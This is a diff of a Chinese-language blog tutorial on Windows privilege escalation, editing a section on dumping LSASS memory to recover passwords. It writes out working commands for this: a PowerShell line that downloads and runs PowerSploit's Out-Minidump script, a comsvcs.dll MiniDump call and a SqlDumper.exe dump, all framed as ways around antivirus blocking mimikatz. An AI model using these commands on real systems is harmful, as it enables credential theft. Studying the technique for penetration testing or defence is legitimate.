@@ -170,13 +170,13 @@
 <img src="/img/post/privilge_escalation_win_getpass2.png" alt="得到密码2" /></p></li>
 
 <li><p>导出NTLM Hash本地得到密码<br />
-若mimikatz和getpass这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密，Procdump是微软官方的软件，应该不会被杀</p>
+若 mimikatz 和 getpass 这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密</p>
 
 <ul>
-<li><p>导出文件dmp文件</p>
+<li><p>导出文件 hash 文件</p>
 
 <ul>
-<li>上传Procdump.exe导出</li>
+<li>上传 Procdump.exe 导出</li>
 </ul>
 
 <blockquote>
@@ -185,11 +185,25 @@
 </blockquote>
 
 <ul>
-<li>或者执行PowerShell导出</li>
+<li>或者执行 PowerShell 导出</li>
 </ul>
 
 <blockquote>
 <pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); &quot;Get-Process lsass | Out-Minidump&quot;
+
+或者
+tasklist /svc |findstr lsass.exe #查看 lsass.exe 的 pid
+powershell -c &quot;rundll32 C:\windows\system32\comsvcs.dll, MiniDump &lt;pid&gt; C:\lsass.dmp full&quot;
+</code></pre>
+</blockquote>
+
+<ul>
+<li>或者用 SqlDumper.exe 导出</li>
+</ul>
+
+<blockquote>
+<pre><code>tasklist /svc |findstr lsass.exe #查看 lsass.exe 的 pid
+&quot;C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe&quot; &lt;pid&gt; 0 0x01100
 </code></pre>
 </blockquote></li>
 
